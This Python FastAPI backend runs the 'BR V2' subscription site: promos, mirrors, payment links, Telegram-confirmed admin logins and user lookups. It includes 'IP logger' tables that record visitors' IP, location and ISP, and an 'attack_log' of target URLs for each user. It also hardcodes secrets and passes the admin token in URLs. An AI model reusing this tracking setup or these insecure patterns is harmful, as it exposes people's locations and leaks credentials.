import os
import json
import asyncio
import asyncpg
import hashlib
import hmac
from urllib.parse import quote
import logging
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from typing import Optional, AsyncGenerator

import aiohttp
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel

# -- Config
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://botuser:botpass123@localhost/botdb")
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "BratokBB")
BOT_TOKEN = os.getenv("TOKEN", "")
NOTIFY_TOKEN = os.getenv("NOTIFY_TOKEN", "") or BOT_TOKEN  # токен зеркала для уведомлений
NOTIFY_ADMINS = [int(x) for x in os.getenv("ADMINS", "8316051968,60693380,8701067595").split(",") if x.strip()]
YM_SECRET = os.getenv("YM_SECRET", "uEyXCRwqs60eoUFLfvUI9cNt")
YM_TOKEN = os.getenv("YM_TOKEN", "")   # YooMoney OAuth access token для API-проверки платежей
BOT_LOGS = int(os.getenv("BOT_LOGS", "8316051968"))
CISPAY_SHOP_ID       = os.getenv("CISPAY_SHOP_ID", "")
CISPAY_API_KEY       = os.getenv("CISPAY_API_KEY", "")
XROCKET_API_KEY      = os.getenv("XROCKET_API_KEY", "")
XROCKET_WEBHOOK_TOKEN = os.getenv("XROCKET_WEBHOOK_TOKEN", "")

# sub type → days (mirrors _SUB_MAP in main.py)
_YM_SUB_DAYS = {
    "1": 1,
    "3": 3,
    "7": 7,
    "30": 30,
    "60": 60,
    "forever": 999,
    "premupgrade": 0,
    "test": 1,
}

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# -- DB pool
pool: asyncpg.Pool = None


async def _ym_check_by_label(label: str) -> str | None:
    """Проверяет YooMoney Operations History по label. Возвращает operation_id если платёж прошёл."""
    if not YM_TOKEN:
        return None
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(
                "https://yoomoney.ru/api/operation-history",
                headers={"Authorization": f"Bearer {YM_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"},
                data={"label": label, "type": "deposition", "records": "10"},
                timeout=aiohttp.ClientTimeout(total=8),
            ) as resp:
                if resp.status != 200:
                    log.warning(f"[ym-api] status {resp.status} for label {label}")
                    return None
                data = await resp.json()
                for op in data.get("operations", []):
                    if op.get("status") == "success":
                        return str(op.get("operation_id", ""))
    except Exception as e:
        log.warning(f"[ym-api] check label={label}: {e}")
    return None


async def _tg_send(token: str, chat_id: int, text: str, parse_mode: str = "MarkdownV2") -> bool:
    """Шлёт Telegram-сообщение. Возвращает True при успехе."""
    try:
        async with aiohttp.ClientSession() as s:
            r = await s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode},
                timeout=aiohttp.ClientTimeout(total=5),
            )
            return (await r.json()).get("ok", False)
    except Exception:
        return False

# -- SSE registry
_sse_queues: set = set()


async def init_site_tables(conn):
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS tg_market_pending (
            user_id BIGINT PRIMARY KEY,
            operation_id TEXT,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_mirrors (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            url TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'active',
            sort_order INT NOT NULL DEFAULT 0,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_reviews (
            id SERIAL PRIMARY KEY,
            author TEXT NOT NULL,
            text TEXT NOT NULL,
            avatar TEXT,
            visible BOOLEAN NOT NULL DEFAULT TRUE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_promos (
            id SERIAL PRIMARY KEY,
            title TEXT NOT NULL,
            code TEXT NOT NULL,
            description TEXT,
            expires_at TIMESTAMPTZ,
            active BOOLEAN NOT NULL DEFAULT TRUE,
            days INT NOT NULL DEFAULT 1,
            activations INT NOT NULL DEFAULT 100,
            promo_type TEXT NOT NULL DEFAULT 'normal',
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS admin_logins (
            id SERIAL PRIMARY KEY,
            ip TEXT NOT NULL,
            user_agent TEXT,
            ua_hash TEXT,
            geo TEXT DEFAULT '',
            logged_at TIMESTAMPTZ DEFAULT NOW(),
            status TEXT DEFAULT 'pending'
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS admin_blocklist (
            id SERIAL PRIMARY KEY,
            ip TEXT NOT NULL UNIQUE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS logger_links (
            id SERIAL PRIMARY KEY,
            token VARCHAR(32) UNIQUE NOT NULL,
            owner_id BIGINT NOT NULL,
            bot_token TEXT NOT NULL DEFAULT '',
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    try:
        await conn.execute("ALTER TABLE logger_links ADD COLUMN IF NOT EXISTS bot_token TEXT NOT NULL DEFAULT ''")
    except Exception:
        pass
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS pay_links (
            token VARCHAR(64) PRIMARY KEY,
            url TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS logger_hits (
            id SERIAL PRIMARY KEY,
            token VARCHAR(32) NOT NULL,
            owner_id BIGINT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            notified BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    # Migrate: add new columns to existing table
    for col, definition in [
        ("days", "INT NOT NULL DEFAULT 1"),
        ("activations", "INT NOT NULL DEFAULT 100"),
        ("promo_type", "TEXT NOT NULL DEFAULT 'normal'"),
    ]:
        try:
            await conn.execute(f"ALTER TABLE site_promos ADD COLUMN IF NOT EXISTS {col} {definition}")
        except Exception:
            pass


@asynccontextmanager
async def lifespan(app: FastAPI):
    global pool
    pool = await asyncpg.create_pool(DATABASE_URL, min_size=2, max_size=10)
    async with pool.acquire() as conn:
        await init_site_tables(conn)
    log.info("DB pool ready")
    yield
    await pool.close()


app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://br-v2.com", "https://www.br-v2.com"],
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)


class MirrorIn(BaseModel):
    name: str
    url: str
    status: str = "active"
    sort_order: int = 0


class ReviewIn(BaseModel):
    author: str
    text: str
    avatar: Optional[str] = None
    visible: bool = True


class PromoIn(BaseModel):
    title: str
    code: str
    description: Optional[str] = None
    expires_at: Optional[str] = None
    active: bool = True
    days: int = 1
    activations: int = 100
    promo_type: str = "normal"


# IP-based brute-force protection: 3 fails → 1h block
_fail_counts: dict = {}
_block_until: dict = {}

def _get_ip(request: Request) -> str:
    return request.headers.get("X-Forwarded-For", request.client.host).split(",")[0].strip()

async def _is_blocked(ip: str) -> bool:
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM admin_blocklist WHERE ip=$1", ip)
        return row is not None

def require_admin(request: Request):
    import time
    ip = _get_ip(request)
    now = time.time()
    if ip in _block_until and _block_until[ip] > now:
        raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")
    auth = request.headers.get("Authorization", "")
    if len(auth) > 300:
        raise HTTPException(status_code=400, detail="Bad request")
    if not auth.startswith("Bearer ") or auth[7:] != ADMIN_TOKEN:
        _fail_counts[ip] = _fail_counts.get(ip, 0) + 1
        if _fail_counts[ip] >= 3:
            _block_until[ip] = now + 3600
            del _fail_counts[ip]
            raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")
        raise HTTPException(status_code=401, detail="Unauthorized")
    _fail_counts.pop(ip, None)
    _block_until.pop(ip, None)

async def _get_geo(ip: str) -> str:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp", timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status == 200:
                    d = await r.json()
                    return f"{d.get('country','?')}, {d.get('city','?')} / {d.get('isp','?')}"
    except Exception:
        pass
    return "—"


async def _get_notify_token(user_id: int = None) -> str:
    """Возвращает токен последнего зеркала пользователя, иначе любое активное зеркало."""
    try:
        async with pool.acquire() as conn:
            if user_id:
                row = await conn.fetchrow(
                    "SELECT mirror_token FROM mirror_assignments WHERE user_id = $1", user_id
                )
                if row and row["mirror_token"]:
                    return row["mirror_token"]
            row = await conn.fetchrow(
                "SELECT token FROM mirrors WHERE active = true ORDER BY random() LIMIT 1"
            )
            if row and row["token"]:
                return row["token"]
    except Exception:
        pass
    return NOTIFY_TOKEN


async def _notify_admin_login(ip, ua, login_id, geo):
    if not BOT_TOKEN:
        return
    from datetime import timezone, timedelta
    msk = datetime.now(timezone(timedelta(hours=3))).strftime("%d.%m.%Y %H:%M:%S")
    lock = chr(0x1F510)
    text = (
        lock + " *Вход в админ панель*\n\n"
        "*IP:* " + ip + "\n"
        "*Гео:* " + geo + "\n"
        "*Устройство:* " + ua[:200] + "\n"
        "*Время (МСК):* " + msk + "\n"
        "*ID сессии:* " + str(login_id) + ""
    )
    btn_ok = chr(0x2705) + " Подтвердить"
    btn_blk = chr(0x1F6AB) + " Заблокировать"
    base = "https://br-v2.com/api/admin/confirm-action/" + str(login_id)
    key = ADMIN_TOKEN
    kb = {
        "inline_keyboard": [[
            {"text": btn_ok, "url": base + "?action=ok&key=" + key},
            {"text": btn_blk, "url": base + "?action=block&key=" + key}
        ]]
    }
    import aiohttp as _h
    async with _h.ClientSession() as s:
        for aid in NOTIFY_ADMINS:
            tok = await _get_notify_token(aid)
            try:
                await s.post(
                    f"https://api.telegram.org/bot{tok}/sendMessage",
                    json={"chat_id": aid, "text": text, "parse_mode": "Markdown", "reply_markup": kb}
                )
            except Exception:
                pass

# -- SSE helpers

async def _fetch_promos_json(conn) -> str:
    rows = await conn.fetch(
        "SELECT id, title, code, description, expires_at, active, days, activations, promo_type "
        "FROM site_promos ORDER BY id DESC"
    )
    return json.dumps([dict(r) for r in rows], default=str)


async def _broadcast_promos():
    if not _sse_queues:
        return
    async with pool.acquire() as conn:
        data = await _fetch_promos_json(conn)
    dead = set()
    for q in list(_sse_queues):
        try:
            q.put_nowait(data)
        except asyncio.QueueFull:
            dead.add(q)
    _sse_queues.difference_update(dead)


async def _sync_to_bot_promo(conn, code: str, days: int, activations: int, promo_type: str, active: bool):
    """Keep bot promocode table in sync with site_promos."""
    upper = code.upper()
    # Always remove old entry first (table may lack UNIQUE constraint)
    await conn.execute("DELETE FROM promocode WHERE UPPER(code) = $1", upper)
    if active:
        await conn.execute(
            "INSERT INTO promocode (code, days, activations, promo_type) VALUES ($1, $2, $3, $4)",
            upper, days, activations, promo_type,
        )


# -- Public endpoints

@app.get("/api/stats")
async def get_stats():
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT COUNT(*) as cnt FROM users")
        count = row["cnt"] if row else 0
    return {"users": count}


@app.get("/api/mirrors")
async def get_mirrors():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, name, url, status FROM site_mirrors ORDER BY sort_order, id"
        )
    return [dict(r) for r in rows]


@app.get("/api/reviews")
async def get_reviews():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, author, text, avatar, created_at FROM site_reviews WHERE visible=TRUE ORDER BY id DESC"
        )
    return [dict(r) for r in rows]


@app.get("/api/promos")
async def get_promos():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, title, code, description, expires_at, active, days, activations, promo_type "
            "FROM site_promos ORDER BY id DESC"
        )
    return [dict(r) for r in rows]


@app.get("/api/promos/stream")
async def promos_stream(request: Request):
    """SSE — pushes updated promo list to all open tabs instantly."""
    q: asyncio.Queue = asyncio.Queue(maxsize=20)
    _sse_queues.add(q)

    async def generator():
        try:
            async with pool.acquire() as conn:
                data = await _fetch_promos_json(conn)
            yield f"data: {data}\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    data = await asyncio.wait_for(q.get(), timeout=20)
                    yield f"data: {data}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            _sse_queues.discard(q)

    return StreamingResponse(
        generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )




async def _is_blocked(ip: str) -> bool:
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM admin_blocklist WHERE ip=$1", ip)
        return row is not None


async def _get_geo(ip: str) -> str:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
                timeout=aiohttp.ClientTimeout(total=3)
            ) as r:
                if r.status == 200:
                    d = await r.json()
                    return f"{d.get('country','?')}, {d.get('city','?')}"  + " / " + d.get('isp','?')
    except Exception:
        pass
    return "—"


async def _notify_admin_login(ip: str, ua: str, login_id: int, geo: str):
    if not BOT_TOKEN:
        return
    from datetime import timezone, timedelta
    msk = datetime.now(timezone(timedelta(hours=3))).strftime("%d.%m.%Y %H:%M:%S")
    text = (
        "🔐 *Вход в админ панель*\n\n"
        f"*IP:* {ip}\n"
        f"*Гео:* {geo}\n"
        f"*Устройство:* {ua[:200]}\n"
        f"*Время (МСК):* {msk}\n"
        f"*ID сессии:* {login_id}"
    )
    kb = {
        "inline_keyboard": [[
            {"text": "✅ Подтвердить", "url": f"https://br-v2.com/api/admin/confirm-action/{login_id}?action=ok&key={ADMIN_TOKEN}"},
            {"text": "🚫 Заблокировать", "url": f"https://br-v2.com/api/admin/confirm-action/{login_id}?action=block&key={ADMIN_TOKEN}"}
        ]]
    }
    async with aiohttp.ClientSession() as s:
        for admin_id in NOTIFY_ADMINS:
            tok = await _get_notify_token(admin_id)
            try:
                await s.post(
                    f"https://api.telegram.org/bot{tok}/sendMessage",
                    json={"chat_id": admin_id, "text": text, "parse_mode": "Markdown", "reply_markup": kb}
                )
            except Exception:
                pass


async def _notify_and_geo(ip: str, ua: str, login_id: int):
    geo = await _get_geo(ip)
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET geo=$1 WHERE id=$2", geo, login_id)
    await _notify_admin_login(ip, ua, login_id, geo)


# -- Admin: ping (auth check + login notification)

@app.get("/api/admin/ping")
async def admin_ping(request: Request, _=Depends(require_admin)):
    ip = _get_ip(request)
    # Check DB blocklist
    if await _is_blocked(ip):
        raise HTTPException(status_code=403, detail="Blocked")
    ua = request.headers.get("User-Agent", "")[:500]
    # If no bot token configured — auto-confirm immediately (no Telegram notification)
    if not BOT_TOKEN:
        async with pool.acquire() as conn:
            row = await conn.fetchrow(
                "INSERT INTO admin_logins (ip, user_agent, status) VALUES ($1, $2, 'confirmed') RETURNING id",
                ip, ua
            )
        from fastapi.responses import JSONResponse
        return JSONResponse(status_code=202, content={"status": "confirmed", "login_id": row["id"]})
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO admin_logins (ip, user_agent) VALUES ($1, $2) RETURNING id",
            ip, ua
        )
    login_id = row["id"]
    asyncio.create_task(_notify_and_geo(ip, ua, login_id))
    from fastapi.responses import JSONResponse
    return JSONResponse(status_code=202, content={"status": "pending", "login_id": login_id})

async def _notify_and_geo(ip: str, ua: str, login_id: int):
    geo = await _get_geo(ip)
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET geo=$1 WHERE id=$2", geo, login_id)
    await _notify_admin_login(ip, ua, login_id, geo)

@app.post("/api/admin/block-ip/{login_id}", dependencies=[Depends(require_admin)])
async def block_ip(login_id: int):
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT ip FROM admin_logins WHERE id=$1", login_id)
        if not row:
            raise HTTPException(404, "Login not found")
        await conn.execute(
            "INSERT INTO admin_blocklist (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING",
            row["ip"]
        )
        await conn.execute("UPDATE admin_logins SET status='blocked' WHERE id=$1", login_id)
    return {"ok": True}

@app.post("/api/admin/confirm-login/{login_id}", dependencies=[Depends(require_admin)])
async def confirm_login(login_id: int):
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET status='confirmed' WHERE id=$1", login_id)
    return {"ok": True}


@app.get("/api/admin/check-session/{login_id}")
async def check_session(login_id: int, authorization: str = ""):
    from fastapi import Header
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT status FROM admin_logins WHERE id=$1", login_id)
    if not row:
        raise HTTPException(status_code=404, detail="Not found")
    return {"status": row["status"]}


@app.get("/api/admin/confirm-action/{login_id}")
async def confirm_action_get(login_id: int, action: str = "", key: str = ""):
    from fastapi.responses import HTMLResponse
    if key != ADMIN_TOKEN:
        return HTMLResponse("<h2>❌ Неверный ключ</h2>", status_code=403)
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT ip FROM admin_logins WHERE id=$1", login_id)
        if not row:
            return HTMLResponse("<h2>❌ Сессия не найдена</h2>", status_code=404)
        ip = row["ip"]
        if action == "ok":
            await conn.execute("UPDATE admin_logins SET status='confirmed' WHERE id=$1", login_id)
            return HTMLResponse(f"<h2>✅ Вход подтверждён</h2><p>ID: {login_id} | IP: {ip}</p>")
        elif action == "block":
            await conn.execute("UPDATE admin_logins SET status='blocked' WHERE id=$1", login_id)
            await conn.execute(
                "INSERT INTO admin_blocklist (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING", ip
            )
            return HTMLResponse(f"<h2>🚫 IP заблокирован</h2><p>{ip}</p>")
        else:
            return HTMLResponse("<h2>❌ Неизвестное действие</h2>", status_code=400)


# -- Admin: mirrors

@app.post("/api/admin/mirrors", dependencies=[Depends(require_admin)])
async def create_mirror(body: MirrorIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO site_mirrors (name, url, status, sort_order) VALUES ($1,$2,$3,$4) RETURNING *",
            body.name, body.url, body.status, body.sort_order
        )
    return dict(row)


@app.put("/api/admin/mirrors/{mid}", dependencies=[Depends(require_admin)])
async def update_mirror(mid: int, body: MirrorIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "UPDATE site_mirrors SET name=$1, url=$2, status=$3, sort_order=$4 WHERE id=$5 RETURNING *",
            body.name, body.url, body.status, body.sort_order, mid
        )
    if not row:
        raise HTTPException(404, "Not found")
    return dict(row)


@app.delete("/api/admin/mirrors/{mid}", dependencies=[Depends(require_admin)])
async def delete_mirror(mid: int):
    async with pool.acquire() as conn:
        await conn.execute("DELETE FROM site_mirrors WHERE id=$1", mid)
    return {"ok": True}


# -- Admin: reviews

@app.post("/api/admin/reviews", dependencies=[Depends(require_admin)])
async def create_review(body: ReviewIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO site_reviews (author, text, avatar, visible) VALUES ($1,$2,$3,$4) RETURNING *",
            body.author, body.text, body.avatar, body.visible
        )
    return dict(row)


@app.put("/api/admin/reviews/{rid}", dependencies=[Depends(require_admin)])
async def update_review(rid: int, body: ReviewIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "UPDATE site_reviews SET author=$1, text=$2, avatar=$3, visible=$4 WHERE id=$5 RETURNING *",
            body.author, body.text, body.avatar, body.visible, rid
        )
    if not row:
        raise HTTPException(404, "Not found")
    return dict(row)


@app.delete("/api/admin/reviews/{rid}", dependencies=[Depends(require_admin)])
async def delete_review(rid: int):
    async with pool.acquire() as conn:
        await conn.execute("DELETE FROM site_reviews WHERE id=$1", rid)
    return {"ok": True}


# -- Admin: promos

@app.post("/api/admin/promos", dependencies=[Depends(require_admin)])
async def create_promo(body: PromoIn):
    expires = None
    if body.expires_at:
        try:
            expires = datetime.fromisoformat(body.expires_at)
        except Exception:
            pass
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            INSERT INTO site_promos (title, code, description, expires_at, active, days, activations, promo_type)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *
            """,
            body.title, body.code.upper(), body.description, expires,
            body.active, body.days, body.activations, body.promo_type,
        )
        await _sync_to_bot_promo(conn, body.code, body.days, body.activations, body.promo_type, body.active)
    asyncio.create_task(_broadcast_promos())
    return dict(row)


@app.put("/api/admin/promos/{pid}", dependencies=[Depends(require_admin)])
async def update_promo(pid: int, body: PromoIn):
    expires = None
    if body.expires_at:
        try:
            expires = datetime.fromisoformat(body.expires_at)
        except Exception:
            pass
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            UPDATE site_promos
            SET title=$1, code=$2, description=$3, expires_at=$4, active=$5,
                days=$6, activations=$7, promo_type=$8
            WHERE id=$9 RETURNING *
            """,
            body.title, body.code.upper(), body.description, expires,
            body.active, body.days, body.activations, body.promo_type, pid,
        )
        if not row:
            raise HTTPException(404, "Not found")
        await _sync_to_bot_promo(conn, body.code, body.days, body.activations, body.promo_type, body.active)
    asyncio.create_task(_broadcast_promos())
    return dict(row)


@app.delete("/api/admin/promos/{pid}", dependencies=[Depends(require_admin)])
async def delete_promo(pid: int):
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT code FROM site_promos WHERE id=$1", pid)
        await conn.execute("DELETE FROM site_promos WHERE id=$1", pid)
        if row:
            await conn.execute("DELETE FROM promocode WHERE code=$1", row["code"])
    asyncio.create_task(_broadcast_promos())
    return {"ok": True}


# ─── Admin: user lookup ──────────────────────────────────────────────────────

@app.get("/api/admin/user/{uid}", dependencies=[Depends(require_admin)])
async def admin_user_lookup(uid: int):
    async with pool.acquire() as conn:
        user = await conn.fetchrow("SELECT * FROM users WHERE user_id=$1", uid)
        if not user:
            raise HTTPException(status_code=404, detail="Пользователь не найден")
        reports = await conn.fetch(
            "SELECT target_url, method, success_count, created_at FROM attack_log WHERE user_id=$1 ORDER BY created_at DESC LIMIT 3",
            uid
        )
        invoices_count = await conn.fetchval("SELECT COUNT(*) FROM paid_invoices WHERE user_id=$1", uid)
        referrer = await conn.fetchrow("SELECT username FROM users WHERE user_id=$1", user["referrer_id"]) if user["referrer_id"] else None
    return {
        "user_id": user["user_id"],
        "username": user["username"] or "",
        "subscribe": user["subscribe"].isoformat() if user["subscribe"] else None,
        "premium": user["premium"] or 0,
        "verified": user["verified"] or 0,
        "free_reports": user["free_reports"] or 0,
        "referral_count": user["referral_count"] or 0,
        "referrer_id": user["referrer_id"],
        "referrer_username": referrer["username"] if referrer else None,
        "lang": user["lang"] or "ru",
        "is_hidden": bool(user.get("is_hidden", True)),
        "manual_confirmed": user.get("manual_confirmed") or 0,
        "wheel_last_spin": user["wheel_last_spin"].isoformat() if user["wheel_last_spin"] else None,
        "wheel_prize": user.get("wheel_prize") or "",
        "invoices_count": invoices_count or 0,
        "last_reports": [
            {
                "target_url": r["target_url"],
                "method": r["method"],
                "success_count": r["success_count"],
                "created_at": r["created_at"].isoformat(),
            }
            for r in reports
        ],
    }


# -- Existing: IP logger


# ─── Pay-link registry (persistent in DB) ────────────────────────────────────

class PayIn(BaseModel):
    url: str


@app.post("/register_pay")
async def register_pay(body: PayIn):
    import secrets
    token = secrets.token_urlsafe(12)
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO pay_links (token, url) VALUES ($1, $2) ON CONFLICT (token) DO UPDATE SET url=$2",
            token, body.url
        )
    return {"token": token}


@app.get("/go/{token}")
async def pay_go(token: str):
    from fastapi.responses import RedirectResponse
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT url FROM pay_links WHERE token=$1", token)
    if not row:
        raise HTTPException(status_code=404, detail="link expired")
    return RedirectResponse(url=row["url"], status_code=302)


@app.get("/api/go/{token}")
async def pay_go_api(token: str):
    from fastapi.responses import RedirectResponse
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT url FROM pay_links WHERE token=$1", token)
    if not row:
        raise HTTPException(status_code=404, detail="link expired")
    return RedirectResponse(url=row["url"], status_code=302)


@app.get("/pay/{token}")
async def pay_redirect(token: str):
    from fastapi.responses import HTMLResponse
    import urllib.parse as _up
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT url FROM pay_links WHERE token=$1", token)
    if not row:
        raise HTTPException(status_code=404, detail="link expired")
    ym_url = row["url"]
    params = dict(_up.parse_qsl(_up.urlparse(ym_url).query))
    amount = params.get("sum", "—")
    targets = _up.unquote(params.get("targets", "Подписка BR V2"))
    go_url = f"/api/go/{token}"
    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BR V2 · Оплата</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800;900&family=Inter:wght@400;500;600&display=swap">
<style>
:root{{--bg:#04040e;--card:rgba(12,11,28,0.92);--card-b:rgba(18,16,40,0.8);--accent:#7c5cfc;--accent-2:#a78bff;--accent-gl:rgba(124,92,252,.18);--text:#f0edff;--sub:#6d6a90;--mute:#1e1c38;--green:#22d3a5;--border:rgba(124,92,252,.22);--shine:rgba(255,255,255,.06)}}
*,*::before,*::after{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:100%}}
body{{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding-block:48px;padding-inline:24px;overflow-x:hidden;position:relative}}
#cv{{position:fixed;inset:0;z-index:0;pointer-events:none}}
.orb{{position:fixed;border-radius:50%;filter:blur(80px);pointer-events:none;z-index:0;animation:drift 12s ease-in-out infinite alternate}}
.orb-1{{width:600px;height:600px;top:-200px;left:-150px;background:radial-gradient(circle,rgba(90,50,220,.28) 0%,transparent 70%);animation-duration:14s}}
.orb-2{{width:500px;height:500px;bottom:-150px;right:-100px;background:radial-gradient(circle,rgba(124,92,252,.22) 0%,transparent 70%);animation-duration:18s;animation-delay:-6s}}
.orb-3{{width:300px;height:300px;top:40%;left:50%;background:radial-gradient(circle,rgba(34,211,165,.10) 0%,transparent 70%);animation-duration:20s;animation-delay:-10s}}
@keyframes drift{{from{{transform:translate(0,0) scale(1)}}to{{transform:translate(40px,30px) scale(1.08)}}}}
.scene{{width:100%;max-width:980px;display:grid;grid-template-columns:430px 1fr;gap:20px;position:relative;z-index:1;align-items:start;animation:fadeUp .7s cubic-bezier(.22,1,.36,1) both}}
@keyframes fadeUp{{from{{opacity:0;transform:translateY(28px)}}to{{opacity:1;transform:translateY(0)}}}}
.pay-card,.info-panel{{background:var(--card);border:1px solid var(--border);border-radius:26px;backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);box-shadow:0 0 0 1px var(--shine) inset,0 2px 0 rgba(255,255,255,.05) inset,0 60px 120px -40px rgba(0,0,0,.9),0 0 80px -20px rgba(124,92,252,.12);position:relative;overflow:hidden}}
.pay-card::before,.info-panel::before{{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,rgba(167,139,255,.7) 40%,rgba(124,92,252,.9) 60%,transparent 100%);z-index:2}}
.pay-card{{padding:40px 36px 36px;display:flex;flex-direction:column}}
.hd{{display:flex;align-items:center;gap:12px;margin-bottom:34px}}
.logo-box{{width:42px;height:42px;background:linear-gradient(135deg,rgba(124,92,252,.3) 0%,rgba(90,50,220,.2) 100%);border:1px solid rgba(124,92,252,.4);border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 16px -6px rgba(124,92,252,.5)}}
.logo-box svg{{width:22px;height:22px}}
.logo-name{{font-family:'Outfit',sans-serif;font-size:22px;font-weight:900;letter-spacing:-.5px}}
.logo-name span{{color:var(--accent-2)}}
.divider{{border:none;border-top:1px solid var(--mute);margin:0 0 30px}}
.product-box{{background:var(--card-b);border:1px solid rgba(124,92,252,.15);border-radius:16px;padding:18px 20px;display:flex;align-items:center;gap:15px;margin-bottom:32px;position:relative;overflow:hidden}}
.product-box::after{{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(124,92,252,.4),transparent)}}
.prod-icon{{width:48px;height:48px;background:linear-gradient(135deg,rgba(124,92,252,.25) 0%,rgba(90,50,220,.15) 100%);border:1px solid rgba(124,92,252,.3);border-radius:13px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:22px;box-shadow:0 4px 12px -4px rgba(124,92,252,.4)}}
.prod-name{{font-family:'Outfit',sans-serif;font-size:16px;font-weight:700;white-space:nowrap;letter-spacing:-.2px}}
.prod-sub{{font-size:12px;color:var(--sub);margin-top:4px}}
.price-label{{font-size:11px;font-weight:600;color:var(--sub);letter-spacing:1.2px;text-transform:uppercase;margin-bottom:6px}}
.price-val{{font-family:'Outfit',sans-serif;font-size:64px;font-weight:900;letter-spacing:-3px;line-height:1;background:linear-gradient(135deg,#f0edff 30%,var(--accent-2) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-variant-numeric:tabular-nums}}
.price-val sup{{font-size:28px;font-weight:800;vertical-align:super;margin-right:2px;background:linear-gradient(135deg,#f0edff 30%,var(--accent-2) 100%);-webkit-background-clip:text;background-clip:text}}
.price-note{{font-size:12px;color:var(--sub);margin-top:8px;margin-bottom:34px;letter-spacing:.3px}}
.btn-wrap{{position:relative;margin-bottom:28px}}
